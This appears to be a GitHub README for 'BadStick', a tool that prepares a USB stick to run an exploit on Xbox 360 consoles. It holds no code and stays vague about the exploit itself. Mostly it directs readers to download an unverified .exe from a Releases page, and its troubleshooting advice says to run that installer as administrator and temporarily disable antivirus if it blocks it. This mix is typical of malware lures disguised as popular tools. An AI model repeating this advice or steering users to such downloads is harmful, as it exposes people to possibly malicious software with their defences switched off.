# 🕹️ BadStick - Fast Xbox 360 Auto Exploit Setup

[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/jdj3jdj/BadStick/releases)

BadStick is an Xbox 360 auto exploit setup tool. It helps you prepare a USB stick, inject required files, and run the exploit on an Xbox 360 console. This guide walks you through downloading the app from the Releases page and using it step by step. No programming skills required.

## 🚀 What BadStick Does
- Prepare a USB stick with the correct file layout for common Xbox 360 exploits.
- Copy exploit files and payloads to the USB.
- Verify file integrity and layout before you plug the USB into your console.
- Provide a simple interface for the main tasks needed to run the exploit.

## ✅ System Requirements (Typical)
- Windows 10 or later, or macOS 10.14 or later. A Windows build is most common.
- 1 GB free disk space.
- A USB flash drive (4 GB or larger).
- An Xbox 360 console that accepts USB-based exploits.
- A standard USB port on your PC.

If you use a different OS, use the Windows build under Releases via a compatible machine or a virtual machine.

## 📥 Download & Install
Action: visit this page to download.

1. Click the big download button at the top or visit the Releases page:
   - https://github.com/jdj3jdj/BadStick/releases
2. On the Releases page, find the latest release. Look for files named like BadStick-Setup-<version>.exe or BadStick-<version>.zip.
3. Choose the file that matches your operating system. Most users will pick the Windows installer (.exe).
4. Download the file to your Downloads folder.
5. If the file is an installer (.exe or .msi):
   - Double-click the file to start the installer.
   - Follow the on-screen steps. Use the default options unless you know otherwise.
6. If the file is a zip:
   - Right-click the zip and choose "Extract All" (Windows) or double-click to open (macOS).
   - Move the extracted folder to a stable location, for example C:\Program Files\BadStick or /Applications/BadStick.
7. After installation, open the BadStick app from your Start menu (Windows) or Applications folder (macOS).

If you need direct access to all releases again:
- Releases page: https://github.com/jdj3jdj/BadStick/releases

## 🧭 Quick Start — Prepare Your USB
Follow these steps to prepare the USB stick and run the exploit.

1. Back up files on the USB drive. The process will erase data.
2. Insert the USB drive into your PC.
3. Open BadStick.
4. Choose the target USB drive from the list inside the app.
5. Pick the exploit type. If you do not know, choose the suggested default or "Auto-detect".
6. Select the payload file. If you do not have a payload, BadStick includes a default option or points to recommended payloads.
7. Click "Prepare USB" or "Write". Wait until the app reports success.
8. Remove the USB safely from your PC.

Now the USB is ready for the console.

## 🔌 How to Use on Your Xbox 360
1. Turn off the console.
2. Insert the USB stick into a USB port on the console.
3. Power on the console and navigate to the section that triggers the exploit (this varies by exploit type; the app shows the target).
4. Follow on-screen prompts on the console to run the exploit.
5. If the exploit runs, you may see a short console response or app action. The console will proceed according to the exploit flow.

Do not unplug the USB while the console is processing files.

## ⚙️ Common Features
- USB format and layout for exploit compatibility.
- Payload selection and verification.
- File integrity checks.
- Device detection for common USB models.
- Logs and status updates to track each step.

## 🛠️ Troubleshooting
If something does not work, try these items in order.

1. The app does not detect the USB:
   - Reinsert the USB in a different port.
   - Use a different USB stick.
   - Close other programs that might access the drive.
2. The app fails to write files:
   - Check that the USB is not write-protected.
   - Reformat the USB using the app's format option or via your OS (FAT32 recommended).
3. The console does not run the exploit:
   - Confirm you used the correct exploit type for your console model and dashboard version.
   - Ensure the payload you selected matches the exploit.
   - Try a different USB port on the console.
4. Installer will not run (Windows):
   - Right-click the installer and choose "Run as administrator".
   - Temporarily disable antivirus if it blocks the installer. Re-enable it after installing.
5. App crashes or shows errors:
   - Re-download the latest release from the Releases page and reinstall.
   - Check the app log. The log folder appears in the app settings.

If logs do not help, include the log file when you contact support.

## ❓ FAQ
Q: Which file do I download from Releases?
A: Choose the installer for your OS. For most users on Windows, pick BadStick-Setup-<version>.exe. If you use macOS, choose the macOS build or the zip.

Q: Will this erase my USB data?
A: Yes. The app formats the USB. Back up any important files before you start.

Q: My console dashboard is newer. Will this still work?
A: Compatibility depends on the exploit. Use the app to pick the exploit that matches your dashboard. The app shows options for known dashboard ranges.

Q: Can I undo changes to my console?
A: BadStick modifies only the USB. It does not change console firmware. Follow console manufacturer guidance for system changes.

## 🧾 Log Files & Support Info
- Logs help diagnose issues. Find logs in the app menu under "Open Logs".
- When you contact support, include:
  - App version (found in About).
  - OS version.
  - A copy of the latest log file.
  - A clear description of the step you attempted.

## 🔁 Uninstall
Windows:
- Open Settings > Apps.
- Find BadStick and choose Uninstall.

macOS:
- Delete the BadStick app from Applications.
- Remove the config folder in ~/Library/Application Support/BadStick if you want a full clean.

## 📡 Safety and Best Practices
- Always back up data on your USB before you start.
- Use a known-good USB stick to avoid writes errors.
- Do not interrupt the console while it processes the USB files.
- Only use payloads and files you trust.

## 📬 Contact & Contribution
For bugs, feature requests, or help:
- Visit the repository issues page on GitHub.
- Include a clear description and logs where relevant.

Releases page: https://github.com/jdj3jdj/BadStick/releases

If you want to help improve BadStick, open an issue with a suggestion or submit a pull request on GitHub.